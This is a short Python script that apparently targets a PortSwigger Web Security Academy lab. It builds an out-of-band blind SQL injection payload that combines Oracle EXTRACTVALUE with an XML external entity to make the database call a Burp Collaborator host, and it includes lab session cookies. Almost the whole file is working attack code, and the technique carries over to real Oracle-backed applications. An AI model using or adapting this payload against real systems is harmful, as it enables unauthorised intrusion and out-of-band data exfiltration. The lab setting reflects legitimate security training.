import requests
import string
from urllib.parse import quote_plus, quote

charset = string.ascii_lowercase + string.digits
# charset = "tdepmpqvc9hdrbscined"

burp0_url = "https://0aad006f049aafea8382ec8f00a60047.web-security-academy.net/filter?category=Gifts"
burp0_cookies = {
    "TrackingId": "Ed2xRAsoCdQUCLLj",
    "session": "OFziHtyoH7bcbbvNjehyjBdh3FsQpqhE",
}



def parse_payload(burp_collaborator_url):
    x = f"""UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{burp_collaborator_url}/"> %remote;]>'),'/l') FROM dual"""
    payload = f"'{quote_plus(x)}--"
    return payload

print(parse_payload("o1qccbamtvzvyoh0ol4ql72zcqih67uw.oastify.com"))